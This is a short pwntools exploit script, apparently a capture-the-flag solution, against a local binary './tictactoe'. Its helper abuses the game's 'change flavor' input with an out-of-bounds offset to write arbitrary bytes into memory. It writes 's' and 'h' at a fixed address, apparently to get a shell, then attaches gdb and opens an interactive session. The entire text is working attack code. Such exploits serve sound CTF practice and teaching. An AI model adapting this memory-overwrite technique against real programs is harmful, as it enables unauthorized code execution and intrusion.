#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def overwrite(addr, val):
    io.sendlineafter("change flavor): ", "9")
    io.sendline(val)
    io.sendlineafter("change flavor): ", str(addr - 0x804B056))
    


io = process("./tictactoe")
io.sendlineafter("(2)nd? ", "1")

overwrite(0x804B048, 's')
gdb.attach(io, "b *0x8048AAE\nc")
overwrite(0x804B048 + 1, 'h')


io.interactive()
io.close()
